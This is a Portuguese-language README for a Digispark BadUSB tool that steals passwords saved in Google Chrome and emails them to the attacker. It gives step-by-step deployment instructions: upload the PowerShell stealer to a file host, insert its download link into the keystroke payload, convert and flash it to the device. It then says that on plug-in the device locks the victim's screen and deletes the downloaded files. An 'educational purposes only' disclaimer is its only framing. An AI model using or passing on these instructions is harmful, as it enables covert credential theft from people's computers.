# AVISO: Apenas para fins educacionais!

_Script criado para o Digispark que coleta senhas salvas do Google Chrome e as envia por e-mail!_
 
## Instalação

- Edite `get_passwords.ps1` e altere-o com as informações de email, destinatário e remetente.

- Faça upload do `get_passwd.ps1` para algum serviço de compartilhamento de arquivos, como o [AnonFiles](https://anonfiles.com/br), por exemplo.

- Abra `Payload.txt`

- Substitua "**LINK-DE-DOWNLOAD-DO-ARQUIVO-PS1**" (mantendo as aspas) pelo link de download do `get_passwd.ps1`.

### - Configurar o Digispark

- Utilizando o [DuckEncoder](https://github.com/mame82/duckencoder.py), converta o aquivo `Payload.txt` para `Payload.bin`:

    `cat Payload.txt | python duckencoder.py -r -l br > Payload.bin`

- Utilizando o [Duck2Spark](https://github.com/mame82/duck2spark), converta o `Payload.bin` para `Payload.ino`:

    `duck2spark.py -i Payload.bin -l 1 -f 2000 -o Payload.ino`

- Depois de [configurar o IDE do Arduino](https://www.arduinoecia.com.br/digispark-attiny85-ide-arduino), abra o exemplo "DigisparkKeyboard" e substitua todo o código por aquele salvo em `Payload.ino`.

## Uso

Plugue o Digispark Rubber Ducky e espere. Depois que o script for executado, ele bloqueará a tela do usuário e excluirá os arquivos baixados.